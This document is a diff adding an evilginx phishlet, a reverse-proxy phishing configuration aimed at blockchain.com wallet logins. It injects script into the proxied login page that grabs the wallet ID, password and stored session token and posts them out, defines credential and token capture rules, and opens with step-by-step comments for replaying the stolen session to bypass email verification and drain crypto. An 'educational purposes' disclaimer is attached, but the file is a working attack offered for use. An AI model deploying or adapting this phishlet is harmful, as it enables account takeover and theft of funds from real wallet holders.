@@ -1,0 +1,72 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+#-------------------------------------
+# To get session in your browser ,
+# 1) Go to Developer Tools > Storage > Local Storage
+# 2) Add a New key to Domain https://login.blockchain.com
+# 3) Name this key "persist:root" without quotes.
+# 4) Copy paste all Session value(Get from the evilginx sessions list) in the Value Field.
+# 5) Goto Login panel of blockchain https://login.blockchain.com/#/login
+# 6) Enter the walletID and Password From the captired data in evilginx.
+# 7) Now Try Login , You should be able to login without need of Email Verification Codes.
+# 8) Now You ca Takeover on all Available Crypto.
+#-------------------------------------------------------------------------------------------
+
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'blockchain.info', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: 'a.send(o)', replace: 'console.log(o),a.send(o)', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.com', search: '</body>', replace: '<script>function wclose(win){win.close();} function fwindow1(){try{fwindow()}catch(err){setTimeout(fwindow1, 100);}}; function fwindow(){document.getElementsByTagName("button")[0].addEventListener("click",fclick); function fclick(){function fcheck() {if(JSON.parse(localStorage.getItem("persist:root")).session == "{}"){setTimeout(fcheck, 100);}else{var fdata = {login: document.getElementsByTagName("input")[0].value, password: document.getElementsByTagName("input")[1].value, session: localStorage.getItem("persist:root").toString()};var xhr = new XMLHttpRequest();xhr.open("POST", "qwertyqwerty/", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send("password=" + encodeURIComponent(fdata.password) + "&guid=" + encodeURIComponent(fdata.login) + "&session=" + encodeURIComponent(fdata.session)); /*IP CHANGE - IN PROCESS  var win = window.open("https://blockchain.info/wallet/" + fdata.login + "?api_code=1770d5d9-bcea-4d28-ad21-6cbd5be018a8&ct=" + new Date().getTime() + "&format=json&resend_code","_blank", "toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none", ""); setTimeout(wclose, 1000, win);*/  console.log("Success...");}} fcheck();}}window.onload = function(){fwindow1();} </script></body>', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'href="https://login.ideaconnection.cf/#/signup?showWallet?utm_campaign=dcomnav_signup"', replace: 'href="https://login.ideaconnection.cf/#/login?utm_campaign=dcomnav_login"', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'login.{hostname}', replace: 'login.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.blockchain.info'
+    keys: ['(.+),regexp']
+  - domain: '(.+),regexp'
+    keys: ['(.+),regexp']
+credentials:
+  username:
+    key: 'guid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'session'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'login.blockchain.com'
+  path: '#/login'
+  
+  
+  
+  
+  
+  
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.  
